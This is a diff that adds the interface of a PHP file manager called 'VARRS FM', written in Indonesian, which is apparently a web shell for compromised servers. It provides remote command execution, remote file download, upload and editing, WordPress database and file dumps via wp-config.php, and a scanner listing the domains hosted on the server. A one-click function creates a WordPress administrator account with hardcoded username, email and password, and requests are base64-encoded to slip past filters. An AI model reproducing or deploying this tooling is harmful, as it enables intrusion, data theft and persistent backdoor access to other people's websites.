+.file-meta .perm { color: #00ff88; font-family: 'JetBrains Mono', monospace; font-weight: 500; }
+.file-meta .sep { color: #4b5563; }
+.file-actions { display: flex; gap: 4px; flex-shrink: 0; }
+.action-icon-btn { width: 30px; height: 30px; background: rgba(30,30,45,0.6); border: 1px solid rgba(255,255,255,0.06); border-radius: 0.5rem; color: #9ca3af; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; font-size: 0.8rem; transition: all 0.15s; }
+.action-icon-btn:hover { background: rgba(0,255,136,0.1); color: #00ff88; border-color: rgba(0,255,136,0.3); }
+.action-icon-btn.menu { background: none; border: none; font-size: 1rem; }
+.dropdown-menu { display: none; position: fixed; background: #1e293b; border: 1px solid rgba(0,255,136,0.3); border-radius: 0.8rem; padding: 6px; min-width: 160px; z-index: 1001; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.dropdown-menu.show { display: block; }
+.dropdown-item { display: flex; align-items: center; gap: 10px; padding: 10px 12px; color: #e2e8f0; font-size: 0.85rem; cursor: pointer; border-radius: 6px; transition: background 0.15s; }
+.dropdown-item:hover { background: rgba(0,255,136,0.1); color: #00ff88; }
+.dropdown-item.danger { color: #ef4444; }
+.dropdown-item.danger:hover { background: rgba(239,68,68,0.15); color: #ef4444; }
+.dropdown-item i { width: 16px; text-align: center; }
+.cmd-output { background: rgba(0,0,0,0.5); border-radius: 0.8rem; padding: 0.8rem; margin: 0.5rem 0.8rem; border-left: 3px solid #00ff88; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; white-space: pre-wrap; word-break: break-all; position: relative; }
+.copy-btn { position: absolute; top: 8px; right: 8px; background: #064e3b; border: none; color: #00ff88; padding: 4px 8px; border-radius: 12px; font-size: 0.7rem; cursor: pointer; }
+.editor-panel { margin: 0.5rem 0.8rem; background: rgba(15,23,42,0.9); border-radius: 1rem; padding: 1rem; border: 1px solid rgba(0,255,136,0.2); }
+textarea { width: 100%; background: #0a0f1c; border: 1px solid #064e3b; color: #e2e8f0; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; padding: 0.8rem; border-radius: 0.8rem; min-height: 200px; }
+.modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); justify-content: center; align-items: center; z-index: 1000; padding: 16px; overflow-y: auto; }
+.modal-card { background: #1a1d24; border-radius: 1rem; padding: 0; width: 100%; max-width: 520px; border: 1px solid rgba(255,255,255,0.08); overflow: hidden; }
+.scanner-header { display: flex; justify-content: space-between; align-items: center; padding: 1rem 1.2rem; border-bottom: 1px solid rgba(255,255,255,0.06); }
+.scanner-header h3 { font-size: 1.1rem; font-weight: 700; color: #e2e8f0; display: flex; align-items: center; gap: 10px; margin: 0; }
+.scanner-header h3 i { color: #00ff88; }
+.scanner-close { background: none; border: none; color: #6b7280; font-size: 1.3rem; cursor: pointer; padding: 4px 8px; border-radius: 6px; transition: all 0.2s; }
+.scanner-close:hover { background: rgba(255,255,255,0.05); color: #e2e8f0; }
+.scanner-info { display: flex; align-items: center; justify-content: space-between; padding: 1rem 1.2rem; background: rgba(0,0,0,0.3); margin: 1rem; border-radius: 0.8rem; border: 1px solid rgba(255,255,255,0.05); gap: 1rem; flex-wrap: wrap; }
+.info-block { flex: 1; min-width: 120px; }
+.info-label { font-size: 0.65rem; color: #6b7280; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; font-weight: 600; }
+.info-value { font-family: 'JetBrains Mono', monospace; font-size: 1.1rem; color: #e2e8f0; font-weight: 600; }
+.info-value.active { color: #00ff88; }
+.btn-copy-list { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 0.5rem 1rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.75rem; font-weight: 600; letter-spacing: 1px; transition: all 0.2s; white-space: nowrap; }
+.btn-copy-list:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); }
+.site-list { padding: 0 1rem 1rem; }
+.site-row { display: flex; align-items: center; justify-content: space-between; padding: 0.9rem 1rem; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.05); border-radius: 0.8rem; margin-bottom: 0.6rem; gap: 10px; transition: all 0.2s; }
+.site-row:hover { background: rgba(0,0,0,0.3); border-color: rgba(0,255,136,0.2); }
+.site-row-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
+.site-row-left i.fa-globe { color: #00ff88; font-size: 1rem; flex-shrink: 0; }
+.site-domain-text { font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; color: #e2e8f0; font-weight: 600; word-break: break-all; }
+.btn-google { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 0.45rem 0.9rem; border-radius: 0.5rem; cursor: pointer; font-size: 0.72rem; font-weight: 600; letter-spacing: 1px; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; white-space: nowrap; transition: all 0.2s; flex-shrink: 0; }
+.btn-google:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: #00ff88; }
+.btn-google i { font-size: 0.75rem; }
+.scanner-actions { display: flex; gap: 8px; padding: 1rem 1.2rem; border-top: 1px solid rgba(255,255,255,0.06); }
+.scanner-actions button { flex: 1; padding: 0.7rem; border-radius: 0.6rem; border: none; cursor: pointer; font-size: 0.85rem; font-weight: 600; transition: all 0.2s; }
+.scanner-actions .btn-start { background: linear-gradient(135deg, #00ff88, #10b981); color: #000; }
+.scanner-actions .btn-start:hover { opacity: 0.9; }
+.scanner-actions .btn-close-scanner { background: rgba(239,68,68,0.15); color: #ef4444; border: 1px solid rgba(239,68,68,0.3); flex: 0 0 auto; padding: 0.7rem 1.2rem; }
+.scanner-actions .btn-close-scanner:hover { background: rgba(239,68,68,0.25); }
+.modal-card-generic { background: #1e293b; border-radius: 1.2rem; padding: 1.5rem; width: 100%; max-width: 450px; border: 1px solid rgba(0,255,136,0.3); }
+.modal-card-generic h3 { margin-bottom: 1rem; font-size: 1.15rem; display: flex; align-items: center; gap: 8px; }
+.modal-card-generic input, .modal-card-generic textarea, .modal-card-generic select { width: 100%; margin: 0.5rem 0 1rem; padding: 0.7rem; border-radius: 0.8rem; background: #0f172a; border: 1px solid #064e3b; color: white; font-size: 0.9rem; }
+.modal-card-generic label { display: block; font-size: 0.8rem; color: #00ff88; margin-top: 0.5rem; }
+.modal-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 1rem; flex-wrap: wrap; }
+.modal-actions button { padding: 0.5rem 1rem; border-radius: 2rem; border: none; background: #064e3b; color: #00ff88; cursor: pointer; font-size: 0.9rem; }
+.modal-actions button.primary { background: linear-gradient(135deg, #00ff88, #10b981); color: #000; font-weight: bold; }
+.footer { position: fixed; bottom: 0; left: 0; right: 0; text-align: center; padding: 0.7rem; color: #6b7280; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; background: rgba(10,10,15,0.95); border-top: 1px solid rgba(255,255,255,0.05); z-index: 100; backdrop-filter: blur(8px); }
+.loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(10,10,15,0.95); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; gap: 16px; }
+.loading-overlay.show { display: flex; }
+.loading-anim { width: 200px; height: 8px; background: rgba(255,255,255,0.1); border-radius: 4px; position: relative; overflow: hidden; }
+.loading-anim::before { content: ''; position: absolute; left: -50%; top: 0; height: 100%; width: 50%; background: linear-gradient(90deg, #00ff88, #10b981); animation: loadSlide 1s ease-in-out infinite; }
+@keyframes loadSlide { 0% { left: -50%; } 100% { left: 100%; } }
+.loading-text { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: #00ff88; letter-spacing: 2px; }
+@media (max-width: 480px) {
+    .file-name { font-size: 0.85rem; }
+    .file-icon { width: 32px; height: 32px; font-size: 1.3rem; }
+    .top-btn { width: 28px; height: 28px; font-size: 0.7rem; }
+    .top-actions { gap: 3px; }
+    .scanner-info { flex-direction: column; align-items: flex-start; }
+    .btn-copy-list { width: 100%; text-align: center; }
+}
+</style>
+</head>
+<body>
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-anim"></div>
+    <div class="loading-text">FETCHING...</div>
+</div>
+<div class="top-bar">
+    <div class="app-logo">
+        <i class="fas fa-book-open"></i>
+        <span>VARRS FM</span>
+    </div>
+    <div class="top-actions">
+        <button class="top-btn" onclick="cd('<?= base64_encode($base_dir) ?>')" title="Home"><i class="fas fa-home"></i></button>
+        <button class="top-btn" onclick="showModal('uploadModal')" title="Upload"><i class="fas fa-upload"></i></button>
+        <button class="top-btn" onclick="showModal('curlModal')" title="Download"><i class="fas fa-download"></i></button>
+        <button class="top-btn" onclick="showModal('cmdModal')" title="Terminal"><i class="fas fa-terminal"></i></button>
+        <button class="top-btn" onclick="showModal('backupWpModal')" title="Backup WP"><i class="fas fa-box-archive"></i></button>
+        <button class="top-btn" onclick="showModal('siteScannerModal')" title="Scanner"><i class="fas fa-globe"></i></button>
+        <button class="top-btn green" onclick="createWpAdminAuto()" title="Create Admin"><i class="fas fa-user-plus"></i></button>
+        <a href="?logout=1" class="top-btn signout" title="Sign Out" onclick="return confirm('Yakin ingin keluar?')"><i class="fas fa-sign-out-alt"></i></a>
+    </div>
+</div>
+<div class="breadcrumbs">
+    <button class="bc-home" onclick="cd('<?= base64_encode($base_dir) ?>')" title="Home"><i class="fas fa-home"></i></button>
+    <?php foreach ($breadcrumbs as $idx => $bc): ?>
+        <span class="bc-sep">/</span>
+        <span class="bc-item <?= $idx === count($breadcrumbs) - 1 ? 'current' : '' ?>" onclick="cd('<?= base64_encode($bc['path']) ?>')"><?= htmlspecialchars($bc['name']) ?></span>
+    <?php endforeach; ?>
+</div>
+<?php if ($cmd_warning): ?>
+<div class="notification warning"><i class="fas fa-exclamation-triangle"></i> <?= htmlspecialchars($cmd_warning) ?></div>
+<?php endif; ?>
+<?php if ($message): ?>
+<div class="notification <?= $message_type ?>"><i class="fas <?= $message_type === 'error' ? 'fa-times-circle' : 'fa-check-circle' ?>"></i> <?= htmlspecialchars($message) ?></div>
+<?php endif; ?>
+<?php if ($cmd_output !== null): ?>
+<div class="cmd-output" id="cmdOutputBox">
+    <strong><i class="fas fa-dollar-sign"></i> <?= htmlspecialchars($cmd_input) ?></strong>
+    <button class="copy-btn" onclick="copyCommandOutput()"><i class="fas fa-copy"></i> Copy</button>
+    <pre style="margin-top:8px;" id="cmdOutputText"><?= htmlspecialchars($cmd_output) ?></pre>
+</div>
+<?php endif; ?>
+<?php if ($edit_mode): ?>
+<div class="editor-panel">
+    <div style="display:flex; justify-content:space-between; margin-bottom:8px; align-items:center;">
+        <span><i class="fas fa-code"></i> Edit: <strong><?= htmlspecialchars($edit_filename) ?></strong></span>
+        <button class="top-btn" onclick="closeEditor()" style="background:#ef4444;color:white;width:auto;padding:0.4rem 0.8rem;"><i class="fas fa-times"></i></button>
+    </div>
+    <form method="post">
+        <input type="hidden" name="action" value="save_edit">
+        <input type="hidden" name="target_file_b64" value="<?= base64_encode($edit_filename) ?>">
+        <textarea name="file_content" rows="12"><?= htmlspecialchars($edit_content) ?></textarea>
+        <div style="display:flex; gap:8px; margin-top:8px; justify-content:flex-end;">
+            <button type="submit" class="top-btn" style="background:#00ff88;color:#000;width:auto;padding:0.5rem 1rem;"><i class="fas fa-save"></i> Simpan</button>
+        </div>
+    </form>
+</div>
+<?php endif; ?>
+<div class="file-list">
+<?php if ($current_dir !== $base_dir): ?>
+<div class="file-item parent" onclick="cd('<?= base64_encode(dirname($current_dir)) ?>')">
+    <div class="file-icon parent-icon"><i class="fas fa-folder-open"></i></div>
+    <div class="file-content">
+        <div class="file-name parent-name">..</div>
+        <div class="file-meta">Go up to parent directory</div>
+    </div>
+    <div class="file-actions">
+        <button class="action-icon-btn" onclick="event.stopPropagation(); showModal('newFolderModal')" title="Folder Baru"><i class="fas fa-folder-plus"></i></button>
+        <button class="action-icon-btn" onclick="event.stopPropagation(); showModal('newFileModal')" title="File Baru"><i class="fas fa-file-medical"></i></button>
+    </div>
+</div>
+<?php endif; ?>
+<?php foreach ($directories as $dir): 
+    $full = $current_dir.'/'.$dir;
+    $perm = getPerms($full);
+    $permColor = getPermsColor($full);
+    $date = formatDate($full);
+?>
+<div class="file-item" onclick="cd('<?= base64_encode($current_dir.'/'.$dir) ?>')">
+    <div class="file-icon folder"><i class="fas fa-folder"></i></div>
+    <div class="file-content">
+        <div class="file-name"><?= htmlspecialchars($dir) ?></div>
+        <div class="file-meta">
+            <span>Folder</span>
+            <span class="sep">•</span>
+            <span class="perm" style="color:<?= $permColor ?>"><?= $perm ?></span>
+            <span class="sep">•</span>
+            <span><?= $date ?></span>
+        </div>
+    </div>
+    <button class="action-icon-btn menu" onclick="event.stopPropagation(); showMenu(event, '<?= base64_encode($dir) ?>', 'folder')"><i class="fas fa-ellipsis-vertical"></i></button>
+</div>
+<?php endforeach; ?>
+<?php foreach ($files as $file): 
+    $full = $current_dir.'/'.$file;
+    $size = formatSize(filesize($full));
+    $perm = getPerms($full);
+    $permColor = getPermsColor($full);
+    $date = formatDate($full);
+?>
+<div class="file-item" onclick="editFile('<?= base64_encode($file) ?>')">
+    <div class="file-icon file"><i class="fas fa-file-lines"></i></div>
+    <div class="file-content">
+        <div class="file-name"><?= htmlspecialchars($file) ?></div>
+        <div class="file-meta">
+            <span><?= $size ?></span>
+            <span class="sep">•</span>
+            <span class="perm" style="color:<?= $permColor ?>"><?= $perm ?></span>
+            <span class="sep">•</span>
+            <span><?= $date ?></span>
+        </div>
+    </div>
+    <button class="action-icon-btn menu" onclick="event.stopPropagation(); showMenu(event, '<?= base64_encode($file) ?>', 'file')"><i class="fas fa-ellipsis-vertical"></i></button>
+</div>
+<?php endforeach; ?>
+</div>
+<div class="footer">© copyright varsival</div>
+<div id="dropdownMenu" class="dropdown-menu"></div>
+<div id="siteScannerModal" class="modal">
+    <div class="modal-card">
+        <div class="scanner-header">
+            <h3><i class="fas fa-globe"></i> SITE SCANNER</h3>
+            <button class="scanner-close" onclick="hideModal('siteScannerModal')"><i class="fas fa-times"></i></button>
+        </div>
+        <?php if (!empty($scan_results)): ?>
+        <div class="scanner-info">
+            <div class="info-block">
+                <div class="info-label">SCAN PATH</div>
+                <div class="info-value"><?= htmlspecialchars($scan_path_name) ?></div>
+            </div>
+            <div class="info-block">
+                <div class="info-label">HOSTS FOUND</div>
+                <div class="info-value active"><?= count($scan_results) ?> Active</div>
+            </div>
+            <button class="btn-copy-list" onclick="copySiteList()"><i class="fas fa-copy"></i> COPY LIST</button>
+        </div>
+        <div class="site-list">
+            <?php foreach ($scan_results as $site): ?>
+            <div class="site-row">
+                <div class="site-row-left">
+                    <i class="fas fa-globe"></i>
+                    <span class="site-domain-text"><?= htmlspecialchars($site['domain']) ?></span>
+                </div>
+                <a href="https://www.google.com/search?q=site:<?= urlencode($site['domain']) ?>" target="_blank" class="btn-google">
+                    <i class="fas fa-search"></i> GOOGLE
+                </a>
+            </div>
+            <?php endforeach; ?>
+        </div>
+        <?php else: ?>
+        <div style="text-align:center;padding:3rem 1rem;color:#6b7280;">
+            <i class="fas fa-satellite-dish" style="font-size:2.5rem;margin-bottom:1rem;opacity:0.3;color:#00ff88;"></i>
+            <p style="font-family:'JetBrains Mono',monospace;font-size:0.85rem;">Belum ada hasil scan.<br>Klik "START SCAN" untuk memulai.</p>
+        </div>
+        <?php endif; ?>
+        <div class="scanner-actions">
+            <form method="POST" style="flex:1;display:flex;">
+                <input type="hidden" name="action" value="site_scan">
+                <input type="hidden" name="scan_path" value="<?= htmlspecialchars($current_dir) ?>">
+                <button type="submit" class="btn-start"><i class="fas fa-search"></i> START SCAN</button>
+            </form>
+            <button class="btn-close-scanner" onclick="hideModal('siteScannerModal')"><i class="fas fa-times"></i></button>
+        </div>
+    </div>
+</div>
+<div id="uploadModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-upload"></i> Upload</h3><input type="file" id="uploadFile"><div class="modal-actions"><button onclick="uploadFile()" class="primary">Upload</button><button onclick="hideModal('uploadModal')">Batal</button></div></div></div>
+<div id="curlModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-cloud-download-alt"></i> Download URL</h3><input type="text" id="fetchUrl" placeholder="https://..."><input type="text" id="saveAs" placeholder="Nama simpan (opsional)"><div class="modal-actions"><button onclick="fetchUrl()" class="primary">Download</button><button onclick="hideModal('curlModal')">Batal</button></div></div></div>
+<div id="newFolderModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-folder-plus"></i> Folder Baru</h3><input type="text" id="folderName" placeholder="nama_folder"><div class="modal-actions"><button onclick="createFolder()" class="primary">Buat</button><button onclick="hideModal('newFolderModal')">Batal</button></div></div></div>
+<div id="newFileModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-file-medical"></i> File Baru</h3><input type="text" id="fileName" placeholder="file.txt"><div class="modal-actions"><button onclick="createFile()" class="primary">Buat</button><button onclick="hideModal('newFileModal')">Batal</button></div></div></div>
+<div id="cmdModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-terminal"></i> Jalankan Perintah</h3><input type="text" id="commandInput" placeholder="ls -la" style="font-family:'JetBrains Mono',monospace;"><div class="modal-actions"><button onclick="runCommand()" class="primary">Execute</button><button onclick="hideModal('cmdModal')">Batal</button></div></div></div>
+<div id="backupWpModal" class="modal">
+    <div class="modal-card-generic">
+        <h3><i class="fas fa-box-archive"></i> Backup WordPress</h3>
+        <div style="background:rgba(0,255,136,0.1);border-left:3px solid #00ff88;padding:8px 12px;border-radius:8px;font-size:0.75rem;color:#00ff88;margin-bottom:10px;"><i class="fas fa-info-circle"></i> Script akan mencari <code>wp-config.php</code> di folder ini.</div>
+        <label>Pilih jenis backup:</label>
+        <select id="backupMode"><option value="both">📦 Files + Database (Lengkap)</option><option value="db">🗄️ Database saja (.sql)</option><option value="files">📁 Files saja (.zip)</option></select>
+        <div class="modal-actions"><button onclick="backupWp()" class="primary"><i class="fas fa-download"></i> Mulai Backup</button><button onclick="hideModal('backupWpModal')">Batal</button></div>
+    </div>
+</div>
+<script>
+function toBase64(str) { try { return btoa(unescape(encodeURIComponent(str))); } catch(e) { return btoa(str); } }
+function showModal(id){document.getElementById(id).style.display='flex';}
+function hideModal(id){document.getElementById(id).style.display='none';}
+function cd(b64path){
+    document.getElementById('loadingOverlay').classList.add('show');
+    var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="cd_b64"><input name="payload_b64" value="'+b64path+'">';document.body.appendChild(f);f.submit();
+}
+function editFile(b64file){
+    document.getElementById('loadingOverlay').classList.add('show');
+    var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="open_edit_b64"><input name="payload_b64" value="'+b64file+'">';document.body.appendChild(f);f.submit();
+}
+function deleteItem(b64target){if(confirm('Hapus permanen?')){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="delete_b64"><input name="target_b64" value="'+b64target+'">';document.body.appendChild(f);f.submit();}}
+function renameItem(b64old){var newname=prompt('Nama baru:');if(newname){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="rename_b64"><input name="old_name_b64" value="'+b64old+'"><input name="new_name_b64" value="'+toBase64(newname)+'">';document.body.appendChild(f);f.submit();}}
+function chmodItem(b64target){var perms=prompt('Permission (contoh: 0755):','0755');if(perms){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="chmod_b64"><input name="target_b64" value="'+b64target+'"><input name="perms" value="'+perms+'">';document.body.appendChild(f);f.submit();}}
+function uploadFile(){var file=document.getElementById('uploadFile').files[0];if(!file){alert('Pilih file');return;}var r=new FileReader();r.onload=function(e){var dataUrl=e.target.result;var b64=dataUrl.split(',')[1];var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="upload_b64"><input name="filename_b64" value="'+toBase64(file.name)+'"><input name="file_data_b64" value="'+b64+'">';document.body.appendChild(f);f.submit();};r.readAsDataURL(file);}
+function fetchUrl(){var url=document.getElementById('fetchUrl').value;if(!url){alert('Masukkan URL');return;}var saveAs=document.getElementById('saveAs').value;var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="curl_download_b64"><input name="url_b64" value="'+toBase64(url)+'"><input name="save_as_b64" value="'+toBase64(saveAs)+'">';document.body.appendChild(f);f.submit();}
+function createFolder(){var name=document.getElementById('folderName').value;if(!name){alert('Masukkan nama folder');return;}var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="new_folder"><input name="folder_name_b64" value="'+toBase64(name)+'">';document.body.appendChild(f);f.submit();}
+function createFile(){var name=document.getElementById('fileName').value;if(!name.trim()){alert('Masukkan nama file');return;}var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="new_file"><input name="file_name_b64" value="'+toBase64(name)+'">';document.body.appendChild(f);f.submit();}
+function closeEditor(){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="close_edit">';document.body.appendChild(f);f.submit();}
+function runCommand(){var cmd=document.getElementById('commandInput').value;if(!cmd.trim()){alert('Masukkan perintah');return;}var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="run_command"><input name="cmd_b64" value="'+toBase64(cmd)+'">';document.body.appendChild(f);f.submit();}
+function backupWp(){if(!confirm('Mulai backup WordPress?'))return;var mode=document.getElementById('backupMode').value;var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="backup_wp"><input name="backup_mode" value="'+mode+'">';document.body.appendChild(f);f.submit();}
+function createWpAdminAuto() { if (!confirm('Yakin ingin membuat user admin secara otomatis?')) return; var f = document.createElement('form'); f.method = 'POST'; f.innerHTML = '<input name="action" value="create_wp_admin"><input name="wp_username" value="Danang"><input name="wp_email" value="tomorosoon@gmail.com"><input name="wp_password" value="Vars993">'; document.body.appendChild(f); f.submit(); }
+function showMenu(event, b64name, type) {
+    event.stopPropagation();
+    var menu = document.getElementById('dropdownMenu');
+    var btn = event.currentTarget;
+    var rect = btn.getBoundingClientRect();
+    var html = '';
+    if (type === 'file') {
+        html += '<div class="dropdown-item" onclick="editFile(\''+b64name+'\')"><i class="fas fa-edit"></i> Edit</div>';
+    }
+    html += '<div class="dropdown-item" onclick="renameItem(\''+b64name+'\')"><i class="fas fa-pen"></i> Rename</div>';
+    html += '<div class="dropdown-item" onclick="chmodItem(\''+b64name+'\')"><i class="fas fa-key"></i> Chmod</div>';
+    html += '<div class="dropdown-item danger" onclick="deleteItem(\''+b64name+'\')"><i class="fas fa-trash-alt"></i> Delete</div>';
+    menu.innerHTML = html;
+    menu.style.top = (rect.bottom + 5) + 'px';
+    menu.style.right = (window.innerWidth - rect.right) + 'px';
+    menu.style.left = 'auto';
+    menu.classList.add('show');
+}
+document.addEventListener('click', function(e) {
+    var menu = document.getElementById('dropdownMenu');
+    if (!e.target.closest('.action-icon-btn') && !e.target.closest('.dropdown-menu')) {
+        menu.classList.remove('show');
+    }
+});
+function copySiteList() {
+    var sites = document.querySelectorAll('.site-domain-text');
+    var list = [];
+    sites.forEach(function(site) { list.push(site.textContent.trim()); });
+    var text = list.join('\n');
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(function() { alert('✅ Daftar domain berhasil disalin!\n\n' + text); });
+    } else {
+        var textarea = document.createElement('textarea'); textarea.value = text; document.body.appendChild(textarea); textarea.select(); document.execCommand('copy'); document.body.removeChild(textarea); alert('✅ Daftar domain berhasil disalin!\n\n' + text);
+    }
+}
+function copyCommandOutput(){var pre=document.getElementById('cmdOutputText');var text=pre.innerText;if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(text).then(function(){showCopyFeedback(true);}).catch(function(){fallbackCopy(text);});}else{fallbackCopy(text);}}
+function fallbackCopy(text){var textarea=document.createElement('textarea');textarea.value=text;document.body.appendChild(textarea);textarea.select();document.execCommand('copy');document.body.removeChild(textarea);showCopyFeedback(true);}
+function showCopyFeedback(success){var btn=document.querySelector('.copy-btn');if(success){btn.innerHTML='<i class="fas fa-check"></i> Copied!';setTimeout(function(){btn.innerHTML='<i class="fas fa-copy"></i> Copy';},1500);}else{btn.innerHTML='<i class="fas fa-times"></i> Gagal';setTimeout(function(){btn.innerHTML='<i class="fas fa-copy"></i> Copy';},1500);}}
+</script>
+</body>
+</html>
